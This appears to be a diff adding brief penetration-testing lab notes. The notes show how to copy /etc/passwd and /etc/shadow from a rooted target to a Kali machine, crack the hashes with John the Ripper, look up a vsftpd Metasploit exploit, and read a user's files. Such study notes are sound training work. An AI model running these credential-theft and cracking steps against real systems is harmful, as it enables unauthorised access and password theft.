@@ -1,0 +1,29 @@
+Must gain root access to target first.  Then type the following on the target machine:
+ 
+download /etc/passwd /home/kali/Desktop/passwd
+download /etc/shadow- /home/kali/Desktop/shadow-
+ 
+In the Kali terminal prompt type:
+ 
+sudo unshadow /home/kali/Desktop/passwd /home/kali/Desktop/shadow- > /home/kali/Desktop/johns_passwd 
+ 
+sudo john --wordlist=/usr/share/john/password.lst /home/kali/Desktop/johns_passwd
+sudo john --show  /home/kali/Desktop/johns_passwd
+
+msf6 > search vsftpd
+msf6 > use 0
+
+
+pwd
+/ = top of tree
+ls -l = list
+first letter d = directory (folder) (look for home)
+
+cd home
+ls -l 
+
+cd jasper
+ls -l
+
+cat = look at file
+cat Candidate-List
